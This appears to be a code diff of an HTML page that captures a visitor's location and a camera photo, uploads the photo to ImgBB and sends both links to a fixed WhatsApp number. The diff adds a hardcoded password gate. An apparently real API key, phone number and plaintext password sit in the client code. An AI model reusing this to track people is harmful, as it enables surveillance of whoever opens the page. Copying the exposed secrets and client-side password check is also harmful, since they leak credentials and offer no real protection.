@@ -8,15 +8,16 @@
 </head>
 <body>
     <h1>Sending Live Location & Photo to WhatsApp...</h1>
-    <p id="status">Initializing...</p>
+    <p id="status">Waiting for authentication...</p>
     <canvas id="canvas" style="display: none;"></canvas>
 
     <script>
         const IMGBB_API_KEY = "83601732f6095faec5d42577498c1da8";  // Replace with your ImgBB API key
         const WHATSAPP_NUMBER = "94713424265";  // Replace with recipient's WhatsApp number
+        const PASSWORD = "Nipunapramod@1";  // Change this to your desired password
 
-        let locationLink = "";  // Store location link
-        let locationFilename = "";  // Store location as filename
+        let locationLink = "";  
+        let locationFilename = "";  
 
         // 📌 Function to send message to WhatsApp
         function sendToWhatsApp(photoLink) {
@@ -33,7 +34,7 @@
                         const lat = position.coords.latitude;
                         const lng = position.coords.longitude;
                         locationLink = `https://www.google.com/maps?q=${lat},${lng}`;
-                        locationFilename = `photo_${lat}_${lng}.png`; // Use location as filename
+                        locationFilename = `photo_${lat}_${lng}.png`;
                         document.getElementById("status").innerText = "Location found! Taking photo...";
                         capturePhoto();
                     },
@@ -82,7 +83,7 @@
             .then(response => response.json())
             .then(data => {
                 if (data.success) {
-                    sendToWhatsApp(data.data.url);  // Send the photo link to WhatsApp
+                    sendToWhatsApp(data.data.url);
                 } else {
                     console.error("ImgBB upload failed:", data.error);
                 }
@@ -92,8 +93,19 @@
             });
         }
 
-        // 📌 Start tracking location
-        window.onload = getLocation;
+        // 📌 Password authentication
+        function authenticate() {
+            const userPassword = prompt("Enter Password:");
+            if (userPassword === PASSWORD) {
+                document.getElementById("status").innerText = "Authenticated! Getting location...";
+                getLocation();
+            } else {
+                document.getElementById("status").innerText = "Access Denied!";
+            }
+        }
+
+        // 📌 Start authentication on page load
+        window.onload = authenticate;
     </script>
 </body>
 </html>
